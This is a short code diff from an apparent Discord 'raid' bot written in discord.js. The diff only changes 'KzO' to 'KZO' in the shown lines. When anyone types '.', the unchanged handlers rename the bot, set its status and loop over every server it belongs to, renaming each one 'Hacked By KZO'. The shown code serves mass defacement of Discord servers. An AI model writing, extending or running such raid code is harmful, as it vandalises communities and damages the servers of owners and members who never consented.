@@ -40,7 +40,7 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/468507316082180107/4
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked By KzO
+LOka.user.setUsername("Hacked By KZO
 
 ")
  
@@ -48,7 +48,7 @@ LOka.user.setUsername("Hacked By KzO
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked By KzO`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked By KZO`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -63,7 +63,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By KzO`)
+             m.setName(`Hacked By KZO`)
 })
 }
 });
